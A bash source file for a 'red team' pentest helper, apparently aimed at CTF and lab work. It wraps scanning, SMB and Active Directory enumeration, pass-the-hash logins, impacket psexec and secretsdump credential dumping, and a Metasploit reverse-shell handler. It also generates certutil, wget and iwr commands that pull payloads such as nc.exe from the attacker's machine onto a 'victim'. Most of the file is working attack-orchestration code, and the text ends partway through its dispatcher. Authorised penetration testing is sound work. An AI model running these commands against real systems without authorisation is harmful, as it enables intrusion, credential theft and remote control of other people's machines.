#!/bin/bash

# ==============================================================================
# PENTEST HELPER - COMBINED TOOL (v2.0)
# ==============================================================================

# --- GLOBAL CONFIGURATION (Adjust these if needed) ---
# Users can override these by exporting them before running the script
: "${SECLISTS_DIR:=/usr/share/seclists}"
WORDLIST_DIR="${SECLISTS_DIR}/Discovery/Web-Content/directory-list-2.3-medium.txt"
WORDLIST_SUBDOMAIN="${SECLISTS_DIR}/Discovery/DNS/subdomains-top1million-5000.txt"
WORDLIST_VHOST="${SECLISTS_DIR}/Discovery/DNS/subdomains-top1million-20000.txt"

# --- GLOBAL COLORS ---
C_HEADER='\033[95m'
C_OKCYAN='\033[96m'
C_OKGREEN='\033[92m'
C_WARNING='\033[93m'
C_FAIL='\033[91m'
C_ENDC='\033[0m'
C_BOLD='\033[1m'

# --- GLOBAL UTILITIES ---

# Helper to print status
log_info() { echo -e "${C_OKCYAN}[*] $1${C_ENDC}"; }
log_success() { echo -e "${C_OKGREEN}[+] $1${C_ENDC}"; }
log_warn() { echo -e "${C_WARNING}[!] $1${C_ENDC}"; }
log_error() { echo -e "${C_FAIL}[-] $1${C_ENDC}"; }

# Unified Clipboard Helper
copy_to_clipboard() {
    local cmd="$1"
    if command -v xclip &>/dev/null; then
        echo -n "$cmd" | xclip -selection clipboard
        log_success "Command copied to clipboard (xclip)."
    elif command -v xsel &>/dev/null; then
        echo -n "$cmd" | xsel --clipboard --input
        log_success "Command copied to clipboard (xsel)."
    elif command -v pbcopy &>/dev/null; then
        echo -n "$cmd" | pbcopy
        log_success "Command copied to clipboard (pbcopy)."
    elif command -v clip.exe &>/dev/null; then
        echo -n "$cmd" | clip.exe
        log_success "Command copied to clipboard (Windows/WSL)."
    else
        log_warn "Clipboard tool not found. Command:"
        echo "$cmd"
    fi
}

# Unified IP Detection
get_ip_address() {
    local iface=$1
    if command -v ip &>/dev/null; then
        ip -4 addr show "$iface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1
    elif command -v ifconfig &>/dev/null; then
        ifconfig "$iface" 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | head -n1
    else
        echo ""
    fi
}

# Execute Command Safe (Replaces eval)
# Usage: execute_cmd <clipboard_bool> <command_array>
execute_cmd() {
    local copy_only=$1
    shift
    local cmd_array=("$@")
    
    # Convert array to string for display/clipboard
    local cmd_str="${cmd_array[*]}"

    if [ "$copy_only" = true ]; then
        copy_to_clipboard "$cmd_str"
    else
        log_info "Running: $cmd_str"
        "${cmd_array[@]}"
    fi
}

# Check if a tool exists
require_tool() {
    if ! command -v "$1" &> /dev/null; then
        log_error "Tool '$1' is required but not installed/found in PATH."
        exit 1
    fi
}

# ==============================================================================
# EXAMPLES / CHEAT SHEET (--examples)
# ==============================================================================
show_examples() {
    cat << 'EOF'
╔════════════════════════════════════════════════════════════════════════════╗
║                    🔴 RED TEAM PENTEST HELPER - EXAMPLES 🔴                ║
╚════════════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📡 INFRASTRUCTURE ENUMERATION (--infra)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔍 Basic Network Scanning
  # Quick Nmap scan
  red.sh --infra -nmap 10.10.10.10
  
  # Fast port scan with Rustscan
  red.sh --infra -rust 10.10.10.10
  
  # Combine multiple scans
  red.sh --infra -nmap -rust 10.10.10.10

🗂️  SMB Enumeration
  # Anonymous SMB enumeration
  red.sh --infra -smb-c 10.10.10.10
  
  # SMB with credentials
  red.sh --infra -smb-c -U admin:password123 10.10.10.10
  
  # Full SMB enumeration suite
  red.sh --infra -smb-c -smb-m -enum4 -U admin:pass 10.10.10.10

🩸 Active Directory
  # BloodHound data collection
  red.sh --infra -bloodhound -U user:pass -D domain.local 10.10.10.10
  
  # NetExec SMB enumeration
  red.sh --infra -nxc -U admin:password 10.10.10.10

🔐 Remote Access
  # RDP connection with shared folder
  red.sh --infra -rdp -U administrator:password 10.10.10.10
  
  # SSH connection
  red.sh --infra -ssh -U root:toor 10.10.10.10
  
  # FTP enumeration (anonymous)
  red.sh --infra -ftp 10.10.10.10

🎯 Metasploit Handler
  # Start reverse shell handler
  red.sh --infra -msf -I tun0 -P 4444

� Windows & AD
  # Evil-WinRM with Hash
  red.sh --infra -ewinrm -U Administrator -H <NTLM_HASH> 10.10.10.10
  
  # Impacket PsExec
  red.sh --infra -psexec -U admin:pass 10.10.10.10
  
  # Kerbrute User Enum
  red.sh --infra -kerbrute -D domain.local 10.10.10.10

�💡 Dry Run (Copy Only)
  # Generate command without executing
  red.sh --infra -nmap -c 10.10.10.10

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 FILE TRANSFER (--file)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🐧 Linux Targets
  # Basic HTTP transfer with wget
  red.sh --file tun0 linpeas.sh
  
  # Using curl
  red.sh --file -t curl tun0 exploit.py
  
  # With output flag
  red.sh --file -w -t wget tun0 payload.elf

🪟 Windows Targets
  # PowerShell download
  red.sh --file -t iwr tun0 winPEAS.exe
  
  # Certutil download
  red.sh --file -t certutil tun0 nc.exe
  
  # SCP Transfer
  red.sh --file -t scp tun0 payload.exe
  
  # Base64 Encode
  red.sh --file -b64 tun0 payload.bin

📂 SMB Transfer
  # Start SMB server
  red.sh --file -s smb tun0 payload.exe

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 WEB RECONNAISSANCE (--web)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔄 Full Workflow
  # Complete subdomain discovery
  red.sh --web example.com --all

🔍 Subdomain Discovery
  # Passive subdomain enumeration
  red.sh --web example.com -subfinder -output
  
  # Active DNS bruteforce
  red.sh --web example.com -gobuster-dns -output
  
  # DNS reconnaissance
  red.sh --web example.com -dns

✅ Web Server Validation
  # Check if web server is alive
  red.sh --web example.com -httpx
  
  # Custom port
  red.sh --web example.com:8080 -httpx

📂 Directory & VHost Discovery
  # Directory bruteforce
  red.sh --web https://example.com -dir -output
  
  # Virtual host discovery
  red.sh --web example.com -ffuf-vhost
  
  # Feroxbuster Scan
  red.sh --web http://example.com -ferox
  
  # WordPress Scan
  red.sh --web http://example.com -wpscan
  
  # Parameter Discovery
  red.sh --web http://example.com -arjun

🛡️  Vulnerability Scanning
  # Nuclei vulnerability scan
  red.sh --web https://example.com -nuclei -output
  
  # WAF detection
  red.sh --web https://example.com -waf

🎨 Advanced Recon
  # Technology detection
  red.sh --web https://example.com -tech
  
  # Take screenshots
  red.sh --web https://example.com -screenshots
  
  # Crawl with Katana
  red.sh --web https://example.com -katana

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 PRO TIPS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ✓ Use -c flag to copy commands without executing (dry run)
  ✓ Use -output flag to save results to files
  ✓ Combine multiple tools in one command for efficiency
  ✓ Use --interactive mode if you're unsure about syntax
  ✓ Check module-specific help: red.sh --infra -h

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For detailed help on a specific module, run:
  red.sh --infra -h
  red.sh --file -h
  red.sh --web -h

EOF
}

# ==============================================================================
# MODULE 1: INFRA (--infra)
# ==============================================================================
module_infra() {
    local INTERFACE="tun0"
    local PORT=4444
    local PAYLOAD="windows/meterpreter/reverse_tcp"
    local CLIPBOARD=false
    local USERPASS=""
    local USERNAME=""
    local PASSWORD=""
    local PASSWORD=""
    local HASH=""
    local DOMAIN=""
    
    local ACTIONS=()
    local TARGET=""

    # Infra Usage
    usage_infra() {
        echo -e "${C_BOLD}Infra Usage:${C_ENDC} $0 --infra|-i [options] <target>"
        echo ""
        echo "Options:"
        echo "  -nmap           Run Nmap scan"
        echo "  -rust           Run Rustscan"
        echo "  -smb-c          Run smbclient"
        echo "  -smb-m          Run smbmap"
        echo "  -enum4          Run enum4linux-ng"
        echo "  -nxc            Run NetExec SMB"
        echo "  -bloodhound     Run BloodHound-CE"
        echo "  -ftp            Run FTP enum"
        echo "  -msf            Start msfconsole handler"
        echo "  -rdp            Run RDP"
        echo "  -ssh            Run SSH"
        echo "  -ewinrm         Run Evil-WinRM"
        echo "  -psexec         Run Impacket PsExec"
        echo "  -wmiexec        Run Impacket WMIexec"
        echo "  -secrets        Run Impacket SecretsDump"
        echo "  -kerbrute       Run Kerbrute User Enum"
        echo "  -U user:pass    Credentials (e.g., admin:password123)"
        echo "  -H hash         NTLM Hash (for Pass-the-Hash)"
        echo "  -D domain       Domain name"
        echo "  -I iface        Interface (default: tun0)"
        echo "  -P port         LPORT (default: 4444)"
        echo "  -c              Copy command only (Dry Run)"
        echo ""
        echo -e "${C_BOLD}Examples:${C_ENDC}"
        echo "  # Quick Nmap scan"
        echo "  $0 --infra -nmap 10.10.10.10"
        echo ""
        echo "  # SMB enumeration with credentials"
        echo "  $0 --infra -smb-c -U admin:password123 10.10.10.10"
        echo ""
        echo "  # Multiple tools at once"
        echo "  $0 --infra -nmap -smb-c -enum4 10.10.10.10"
        echo ""
        echo "  # BloodHound collection"
        echo "  $0 --infra -bloodhound -U user:pass -D domain.local 10.10.10.10"
        echo ""
        echo "  # RDP connection with shared folder"
        echo "  $0 --infra -rdp -U admin:password 10.10.10.10"
        echo ""
        echo "  # Copy command without executing (dry run)"
        echo "  $0 --infra -nmap -c 10.10.10.10"
        exit 1
    }

    if [ $# -lt 1 ]; then usage_infra; fi

    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help) usage_infra ;;
            -smb-c) ACTIONS+=("smbclient") ;;
            -smb-m) ACTIONS+=("smbmap") ;;
            -enum4) ACTIONS+=("enum4linux") ;;
            -nxc) ACTIONS+=("nxc") ;;
            -bloodhound) ACTIONS+=("bloodhound") ;;
            -ftp) ACTIONS+=("ftp") ;;
            -msf) ACTIONS+=("msf") ;;
            -nmap) ACTIONS+=("nmap") ;;
            -rust) ACTIONS+=("rust") ;;
            -rdp) ACTIONS+=("rdp") ;;
            -rdp) ACTIONS+=("rdp") ;;
            -ssh) ACTIONS+=("ssh") ;;
            -ewinrm) ACTIONS+=("ewinrm") ;;
            -psexec) ACTIONS+=("psexec") ;;
            -wmiexec) ACTIONS+=("wmiexec") ;;
            -secrets) ACTIONS+=("secrets") ;;
            -kerbrute) ACTIONS+=("kerbrute") ;;
            -H) HASH=$2; shift ;;
            -U) 
                USERPASS=$2
                if [[ "$USERPASS" == *":"* ]]; then
                    USERNAME="${USERPASS%%:*}"
                    PASSWORD="${USERPASS#*:}"
                else
                    USERNAME="$USERPASS"
                    PASSWORD=""
                fi
                shift 
                ;;
            -I) INTERFACE=$2; shift ;;
            -P) PORT=$2; shift ;;
            --payload) PAYLOAD=$2; shift ;;
            -c) CLIPBOARD=true ;;
            -D) DOMAIN=$2; shift ;;
            -*) 
                log_error "Unknown infra option: $1"
                echo -e "${C_WARNING}Hint: Run '$0 --infra -h' to see all available options${C_ENDC}"
                usage_infra 
                ;;
            *)
                if [ -z "$TARGET" ]; then TARGET="$1"
                else 
                    log_error "Multiple targets specified: $1"
                    echo -e "${C_WARNING}Hint: Only one target can be specified at a time${C_ENDC}"
                    usage_infra
                fi
                ;;
        esac
        shift
    done

    if [ -z "$TARGET" ]; then 
        log_error "Target not specified."
        echo -e "${C_WARNING}Hint: You must provide a target IP or hostname${C_ENDC}"
        echo "Example: $0 --infra -nmap 10.10.10.10"
        usage_infra
    fi

    # --- Execution Logic ---
    for action in "${ACTIONS[@]}"; do
        case $action in
            smbclient)
                local cmd=("smbclient" "-L" "//$TARGET/")
                if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
                    cmd+=("-U" "$USERNAME%$PASSWORD")
                else
                    cmd+=("-N")
                fi
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            smbmap)
                local cmd=("smbmap" "-H" "$TARGET")
                if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
                    cmd+=("-u" "$USERNAME" "-p" "$PASSWORD")
                else
                    cmd+=("-u" "null" "-p" "null")
                fi
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            enum4linux)
                local cmd=("enum4linux-ng" "-A")
                [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && cmd+=("-u" "$USERNAME" "-p" "$PASSWORD")
                cmd+=("$TARGET")
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            nxc)
                if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
                    execute_cmd "$CLIPBOARD" "nxc" "smb" "$TARGET" "-u" "$USERNAME" "-p" "$PASSWORD"
                else
                    log_warn "NetExec requires credentials (-U)."
                    echo -e "${C_WARNING}Example: $0 --infra -nxc -U admin:password $TARGET${C_ENDC}"
                fi
                ;;
            bloodhound)
                if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && [ -n "$DOMAIN" ]; then
                    execute_cmd "$CLIPBOARD" "bloodhound-ce-python" "-u" "$USERNAME" "-p" "$PASSWORD" "-ns" "$TARGET" "-d" "$DOMAIN" "-c" "all"
                else
                    log_warn "BloodHound requires user, pass (-U) and domain (-d)."
                    echo -e "${C_WARNING}Example: $0 --infra -bloodhound -U user:pass -d domain.local $TARGET${C_ENDC}"
                fi
                ;;
            ftp)
                local u="anonymous" p="anonymous"
                [ -n "$USERNAME" ] && u="$USERNAME"
                [ -n "$PASSWORD" ] && p="$PASSWORD"
                execute_cmd "$CLIPBOARD" "lftp" "-u" "$u,$p" "ftp://$TARGET"
                ;;
            msf)
                local ip=$(get_ip_address "$INTERFACE")
                if [ -z "$ip" ]; then log_error "No IP on $INTERFACE"; exit 1; fi
                # MSF is tricky with arrays due to internal quotes, treating as string for MSF specific arg
                local msf_cmd="use exploit/multi/handler; set payload $PAYLOAD; set LHOST $ip; set LPORT $PORT; run"
                execute_cmd "$CLIPBOARD" "msfconsole" "-q" "-x" "$msf_cmd"
                ;;
            nmap)
                execute_cmd "$CLIPBOARD" "nmap" "-sV" "-sC" "-Pn" "-v" "$TARGET"
                ;;
            rust)
                execute_cmd "$CLIPBOARD" "rustscan" "-a" "$TARGET" "--ulimit" "5000"
                ;;
            rdp)
                local dir=$(pwd)
                local cmd=("xfreerdp3" "/v:$TARGET" "+clipboard" "/dynamic-resolution" "/drive:share,$dir")
                [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] && cmd+=("/u:$USERNAME" "/p:$PASSWORD")
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            ssh)
                if [ -z "$USERNAME" ]; then 
                    log_error "SSH requires -U user:pass"
                    echo -e "${C_WARNING}Example: $0 --infra -ssh -U root:password $TARGET${C_ENDC}"
                    exit 1
                fi
                execute_cmd "$CLIPBOARD" "sshpass" "-p" "$PASSWORD" "ssh" "$USERNAME@$TARGET"
                ;;
            ewinrm)
                local cmd=("evil-winrm" "-i" "$TARGET")
                [ -n "$USERNAME" ] && cmd+=("-u" "$USERNAME")
                [ -n "$PASSWORD" ] && cmd+=("-p" "$PASSWORD")
                [ -n "$HASH" ] && cmd+=("-H" "$HASH")
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            psexec)
                local creds=""
                if [ -n "$USERNAME" ]; then
                    creds="$USERNAME"
                    [ -n "$PASSWORD" ] && creds="${creds}:$PASSWORD"
                fi
                [ -n "$HASH" ] && [ -n "$USERNAME" ] && creds="${USERNAME}" # Impacket uses -hashes for hash
                
                local cmd=("impacket-psexec" "$creds@$TARGET")
                [ -n "$HASH" ] && cmd+=("-hashes" "$HASH")
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            wmiexec)
                local creds=""
                if [ -n "$USERNAME" ]; then
                    creds="$USERNAME"
                    [ -n "$PASSWORD" ] && creds="${creds}:$PASSWORD"
                fi
                [ -n "$HASH" ] && [ -n "$USERNAME" ] && creds="${USERNAME}"
                
                local cmd=("impacket-wmiexec" "$creds@$TARGET")
                [ -n "$HASH" ] && cmd+=("-hashes" "$HASH")
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            secrets)
                local creds=""
                if [ -n "$USERNAME" ]; then
                    creds="$USERNAME"
                    [ -n "$PASSWORD" ] && creds="${creds}:$PASSWORD"
                fi
                [ -n "$HASH" ] && [ -n "$USERNAME" ] && creds="${USERNAME}"
                
                local cmd=("impacket-secretsdump" "$creds@$TARGET")
                [ -n "$HASH" ] && cmd+=("-hashes" "$HASH")
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
            kerbrute)
                local cmd=("kerbrute" "userenum" "--dc" "$TARGET" "-d" "$DOMAIN" "users.txt")
                if [ -z "$DOMAIN" ]; then
                     log_warn "Kerbrute usually requires a domain (-d)."
                fi
                execute_cmd "$CLIPBOARD" "${cmd[@]}"
                ;;
        esac
    done
}

# ==============================================================================
# MODULE 2: FILE (--file)
# ==============================================================================
module_file() {
    local SAVE_FILE=false
    local TOOL="wget"
    local SERVER="http"
    local INTERFACE=""
    local FILENAME=""

    usage_file() {
        echo -e "${C_BOLD}File Usage:${C_ENDC} $0 --file|-f [options] <interface> <filename>"
        echo ""
        echo "Options:"
        echo "  -w            Add output flag (-O/-o)"
        echo "  -t <tool>     wget | curl | iwr | certutil | scp (default: wget)"
        echo "  -s <server>   http | smb (default: http)"
        echo "  -b64          Base64 encode file content"
        echo ""
        echo -e "${C_BOLD}Examples:${C_ENDC}"
        echo "  # Start HTTP server and generate wget command"
        echo "  $0 --file tun0 linpeas.sh"
        echo ""
        echo "  # Generate PowerShell download command"
        echo "  $0 --file -t iwr tun0 winPEAS.exe"
        echo ""
        echo "  # Generate curl command with output flag"
        echo "  $0 --file -w -t curl tun0 exploit.py"
        echo ""
        echo "  # Start SMB server instead of HTTP"
        echo "  $0 --file -s smb tun0 payload.exe"
        echo ""
        echo "  # Generate certutil command for Windows"
        echo "  $0 --file -t certutil eth0 nc.exe"
        echo ""
        echo "  # Base64 encode a file"
        echo "  $0 --file -b64 tun0 payload.bin"
        exit 1
    }

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help) usage_file ;;
            -w) SAVE_FILE=true ;;
            -t) TOOL="$2"; shift ;;
            -s) SERVER="$2"; shift ;;
            -b64) TOOL="base64" ;;
            -*) 
                log_error "Unknown file option: $1"
                echo -e "${C_WARNING}Hint: Run '$0 --file -h' to see all available options${C_ENDC}"
                usage_file 
                ;;
            *)
                if [ -z "$INTERFACE" ]; then INTERFACE="$1"
                elif [ -z "$FILENAME" ]; then FILENAME="$1"
                else log_error "Too many arguments"; usage_file; fi
                ;;
        esac
        shift
    done

    if [ -z "$INTERFACE" ] || [ -z "$FILENAME" ]; then 
        log_error "Missing required arguments"
        echo -e "${C_WARNING}Hint: You must provide both interface and filename${C_ENDC}"
        echo "Example: $0 --file tun0 linpeas.sh"
        usage_file
    fi

    local IP_ADDR=$(get_ip_address "$INTERFACE")
    if [ -z "$IP_ADDR" ]; then
        log_error "Could not find IP address for interface $INTERFACE"
        exit 1
    fi

    local cmd_arr=()
    case "$TOOL" in
        wget)
            cmd_arr=("wget" "http://$IP_ADDR:8000/$FILENAME")
            [ "$SAVE_FILE" = true ] && cmd_arr+=("-O" "$FILENAME")
            ;;
        curl)
            if [ "$SAVE_FILE" = true ]; then
                cmd_arr=("curl" "http://$IP_ADDR:8000/$FILENAME" "-o" "$FILENAME")
            else
                cmd_arr=("curl" "-O" "http://$IP_ADDR:8000/$FILENAME")
            fi
            ;;
        iwr)
            cmd_arr=("iwr" "http://$IP_ADDR:8000/$FILENAME" "-OutFile" "$FILENAME")
            ;;
        certutil)
            cmd_arr=("certutil" "-urlcache" "-split" "-f" "http://$IP_ADDR:8000/$FILENAME" "$FILENAME")
            ;;
        scp)
            local curr_dir=$(pwd)
            cmd_arr=("scp" "user@$IP_ADDR:$curr_dir/$FILENAME" ".")
            ;;
        base64)
            if [ -f "$FILENAME" ]; then
                echo -e "${C_OKGREEN}[+] Base64 encoded content of $FILENAME:${C_ENDC}"
                if [[ "$(uname -s)" == "Darwin" ]]; then
                    base64 -b 0 < "$FILENAME"
                else
                    base64 -w 0 < "$FILENAME"
                fi
                echo ""
                return
            else
                log_error "File '$FILENAME' not found locally for base64 encoding."
                exit 1
            fi
            ;;
        *) 
            log_error "Invalid tool. Options: wget, curl, iwr, certutil, scp"
            echo -e "${C_WARNING}Example: $0 --file -t curl tun0 file.txt${C_ENDC}"
            exit 1 
            ;;
    esac

    # Just print/copy the download command, don't execute it (since it's for the victim)
    copy_to_clipboard "${cmd_arr[*]}"

    if [[ "$TOOL" == "base64" || "$TOOL" == "scp" ]]; then
        return
    fi

    log_info "Starting $SERVER server on $INTERFACE ($IP_ADDR)..."
    if [ "$SERVER" = "http" ]; then
        log_info "Press Ctrl+C to stop the server."
        python3 -m http.server 8000
    elif [ "$SERVER" = "smb" ]; then
        require_tool "impacket-smbserver"
        sudo impacket-smbserver share . -smb2support
    else
        log_error "Invalid server type."
        exit 1
    fi
}

# ==============================================================================
# MODULE 3: WEB (--web)
# ==============================================================================
module_web() {
    local TARGET=""
    local SCAN_MODE=""
    local OUTPUT_ENABLED=false
    local COPY_COMMAND=false
    local PORT=""

    usage_web() {
        echo -e "${C_BOLD}Web Usage:${C_ENDC} $0 --web|-w <target> [scan_flag]"
        echo ""
        echo "Flags:"
        echo "  --all                Full workflow (Subfinder -> HTTPX)"
        echo "  -subfinder           Passive Subdomain"
        echo "  -gobuster-dns        Active Subdomain"
        echo "  -httpx               Web Server Validation"
        echo "  -subzy               Takeover"
        echo "  -dir                 Dir Bruteforce"
        echo "  -ferox               Feroxbuster Dir Scan"
        echo "  -nuclei              Vuln Scan"
        echo "  -wpscan              WordPress Scan"
        echo "  -arjun               Parameter Discovery"
        echo "  -zap                 OWASP ZAP"
        echo "  -output              Enable file output"
        echo "  -c                   Copy command only"
        echo ""
        echo -e "${C_BOLD}Examples:${C_ENDC}"
        echo "  # Full subdomain discovery workflow"
        echo "  $0 --web example.com --all"
        echo ""
        echo "  # Passive subdomain enumeration"
        echo "  $0 --web example.com -subfinder -output"
        echo ""
        echo "  # Directory bruteforce"
        echo "  $0 --web https://example.com -dir"
        echo ""
        echo "  # Check if web server is alive on custom port"
        echo "  $0 --web example.com:8080 -httpx"
        echo ""
        echo "  # Vulnerability scan with Nuclei"
        echo "  $0 --web https://example.com -nuclei -output"
        echo ""
        echo "  # Virtual host discovery"
        echo "  $0 --web example.com -ffuf-vhost"
        exit 1
    }

    if [ $# -lt 1 ]; then usage_web; fi

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -h|--help) usage_web ;;
            -all|--all) SCAN_MODE="all" ;;
            -subfinder|--subfinder) SCAN_MODE="subfinder" ;;
            -gobuster-dns|--gobuster-dns) SCAN_MODE="gobuster-dns" ;;
            -gobuster-vhost|--gobuster-vhost) SCAN_MODE="gobuster-vhost" ;;
            -dns|--dns) SCAN_MODE="dns" ;;
            -ffuf-vhost|--ffuf-vhost) SCAN_MODE="vhost" ;;
            -httpx|--httpx) SCAN_MODE="httpx" ;;
            -subzy|--subzy) SCAN_MODE="subzy" ;;
            -katana|--katana) SCAN_MODE="katana" ;;
            -dir|--dir) SCAN_MODE="dir" ;;
            -ferox|--ferox) SCAN_MODE="ferox" ;;
            -nuclei|--nuclei) SCAN_MODE="nuclei" ;;
            -wpscan|--wpscan) SCAN_MODE="wpscan" ;;
            -arjun|--arjun) SCAN_MODE="arjun" ;;
            -zap|--zap) SCAN_MODE="zap" ;;
            -waf|--waf) SCAN_MODE="waf" ;;
            -screenshots|--screenshots) SCAN_MODE="screenshots" ;;
            -tech|--tech) SCAN_MODE="tech" ;;
            -output|--output) OUTPUT_ENABLED=true ;;
            -c) COPY_COMMAND=true ;;
            -*) 
                log_error "Unknown web arg: $1"
                echo -e "${C_WARNING}Hint: Run '$0 --web -h' to see all available options${C_ENDC}"
                usage_web 
                ;;
            *)
                if [ -z "$TARGET" ]; then
                    TARGET="$1"
                    if [[ "$TARGET" =~ :([0-9]+)$ ]]; then
                        PORT="${BASH_REMATCH[1]}"
                        TARGET=$(echo "$TARGET" | sed -E 's/:[0-9]+$//')
                    fi
                    TARGET=$(echo "$TARGET" | sed -E 's/^(http|https):\/\///i')
                else
                    log_error "Multiple targets specified: $1"; usage_web
                fi
                ;;
        esac
        shift
    done

    if [ -z "$TARGET" ]; then 
        log_error "Target required"
        echo -e "${C_WARNING}Hint: You must provide a target domain or URL${C_ENDC}"
        echo "Example: $0 --web example.com -subfinder"
        usage_web
    fi
    if [ -z "$SCAN_MODE" ]; then 
        log_error "Scan mode required"
        echo -e "${C_WARNING}Hint: You must specify what type of scan to perform${C_ENDC}"
        echo "Example: $0 --web example.com -subfinder"
        usage_web
    fi

    get_url() { [[ "$TARGET" =~ ^https:// ]] && echo "https://$TARGET" || echo "http://$TARGET"; }
    local URL=$(get_url)
    [ -n "$PORT" ] && URL="${URL}:${PORT}"

    local cmd=()

    case "$SCAN_MODE" in
        "subfinder")
            cmd=("subfinder" "-d" "$TARGET")
            $OUTPUT_ENABLED && cmd+=("-o" "subfinder_output.txt")
            ;;
        "gobuster-dns")
            require_tool "gobuster"
            cmd=("gobuster" "dns" "-d" "$TARGET" "-w" "$WORDLIST_SUBDOMAIN")
            $OUTPUT_ENABLED && cmd+=("-o" "gobuster_subdomain_output.txt")
            ;;
        "dns")
            cmd=("dnsrecon" "-d" "$TARGET" "-t" "brf" "-w" "$WORDLIST_SUBDOMAIN" "-f" "-n" "8.8.8.8")
            $OUTPUT_ENABLED && cmd+=("-j" "dnsrecon_output.json")
            ;;
        "httpx")
            cmd=("httpx" "-u" "$URL")
            [ -n "$PORT" ] && cmd+=("-p" "$PORT")
            $OUTPUT_ENABLED && cmd+=("-o" "httpx_output.txt")
            ;;
        "vhost")
            cmd=("ffuf" "-u" "$URL" "-H" "Host:FUZZ.$TARGET" "-w" "$WORDLIST_VHOST" "-ic")
            $OUTPUT_ENABLED && cmd+=("-o" "ffuf_vhost_output.txt")
            ;;
        "dir")
            cmd=("ffuf" "-u" "$URL/FUZZ" "-w" "$WORDLIST_DIR" "-ic")
            $OUTPUT_ENABLED && cmd+=("-o" "ffuf_dir_output.txt")
            ;;
        "ferox")
            cmd=("feroxbuster" "-u" "$URL" "-w" "$WORDLIST_DIR")
            $OUTPUT_ENABLED && cmd+=("-o" "ferox_output.txt")
            ;;
        "nuclei")
            cmd=("nuclei" "-u" "$URL")
            $OUTPUT_ENABLED && cmd+=("-o" "nuclei_output.txt")
            ;;
        "wpscan")
            cmd=("wpscan" "--url" "$URL" "--enumerate" "p,t,u")
            $OUTPUT_ENABLED && cmd+=("-o" "wpscan_output.txt")
            ;;
        "arjun")
            cmd=("arjun" "-u" "$URL")
            $OUTPUT_ENABLED && cmd+=("-o" "arjun_output.json")
            ;;
        "all")
             log_info "[WORKFLOW] Subfinder -> HTTPX"
             cmd1=("subfinder" "-d" "$TARGET" "-o" "subfinder_out.txt")
             cmd2=("httpx" "-l" "subfinder_out.txt" "-o" "httpx_out.txt")
             execute_cmd false "${cmd1[@]}"
             execute_cmd false "${cmd2[@]}"
             return
             ;;
         *)
            # Generic fallback for tools that just take the URL/Target
            # Add specific tools here if they have unique flags
            log_error "Command construction for $SCAN_MODE not fully implemented in refactor"
            exit 1
            ;;
    esac

    execute_cmd "$COPY_COMMAND" "${cmd[@]}"
}

# ==============================================================================
# COMPLETION GENERATOR
# ==============================================================================
generate_completion() {
    cat <<EOF
# Bash Completion for Pentest Helper
_pentest_helper_completion() {
    local cur prev words cword
    _init_completion -n : || return

    local main_opts="--infra --file --web --install-completion"
    local infra_opts="-nmap -rust -smb-c -smb-m -enum4 -nxc -bloodhound -ftp -msf -rdp -ssh -ewinrm -psexec -wmiexec -secrets -kerbrute -U -H -D -I -P --payload -c"
    local file_opts="-w -t -s -b64"
    local web_opts="--all -subfinder -gobuster-dns -gobuster-vhost -dns -ffuf-vhost -httpx -subzy -katana -dir -ferox -nuclei -wpscan -arjun -zap -waf -screenshots -tech -output -c"

    local mode=""
    for ((i=1; i < cword; i++)); do
        if [[ "\${words[i]}" == "--infra" ]]; then mode="infra"; break; fi
        if [[ "\${words[i]}" == "--file" ]]; then mode="file"; break; fi
        if [[ "\${words[i]}" == "--web" ]]; then mode="web"; break; fi
    done

    case "\$mode" in
        infra) COMPREPLY=( \$(compgen -W "\$infra_opts" -- "\$cur") ); return 0 ;;
        file) COMPREPLY=( \$(compgen -W "\$file_opts" -- "\$cur") ); return 0 ;;
        web) COMPREPLY=( \$(compgen -W "\$web_opts" -- "\$cur") ); return 0 ;;
        *) if [[ "\$cur" == -* ]]; then COMPREPLY=( \$(compgen -W "\$main_opts" -- "\$cur") ); fi; return 0 ;;
    esac
}
complete -F _pentest_helper_completion $(basename "$0")
EOF
}

# ==============================================================================
# MAIN DISPATCHER
# ==============================================================================

if [ $# -eq 0 ]; then
